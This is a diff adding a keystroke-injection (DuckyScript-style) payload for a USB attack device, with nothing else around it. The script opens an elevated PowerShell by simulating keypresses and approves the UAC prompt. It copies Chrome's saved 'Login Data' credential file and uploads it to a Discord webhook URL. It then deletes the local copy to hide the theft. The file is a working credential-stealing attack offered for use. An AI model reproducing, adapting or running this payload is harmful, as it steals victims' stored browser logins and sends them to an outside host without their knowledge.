@@ -1,0 +1,31 @@
+DELAY 750
+WINDOWS d
+DELAY 1500
+WINDOWS r
+DELAY 1500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 750
+LEFTARROW
+ENTER
+DELAY 2000
+ALT y
+DELAY 1200
+GUI UP
+DELAY 1200
+ 
+STRING $sourceFile1 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"; $outputFile1 = "$([System.Environment]::GetFolderPath('Desktop'))\output.txt"; Copy-Item $sourceFile1 $outputFile1
+ 
+ENTER
+ 
+DELAY 500
+ 
+STRING $payload = @{ content = ':)' } | ConvertTo-Json; $fileBytes = [System.IO.File]::ReadAllBytes($outputFile1); $fileContent = [System.Text.Encoding]::UTF8.GetString($fileBytes); $boundary = [System.Guid]::NewGuid().ToString(); $LF = "`r`n"; $body = @('--' + $boundary, 'Content-Disposition: form-data; name="payload_json"', '', $payload, '--' + $boundary, 'Content-Disposition: form-data; name="file"; filename="output.txt"', 'Content-Type: application/octet-stream', '', $fileContent, '--' + $boundary + '--', '') -join $LF; $headers = @{ 'Content-Type' = "multipart/form-data; boundary=$boundary" }; Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1174869383433175091/zR2jc5lKRADG3hbIatlFUjnaMhZilNixBAabG8uxV-2FUmsJpWH79hjYBu8xGT00xe-m' -Method Post -Headers $headers -Body $body
+ 
+ENTER
+ 
+DELAY 5000
+ 
+STRING Remove-Item $outputFile1
+ 
+ENTER
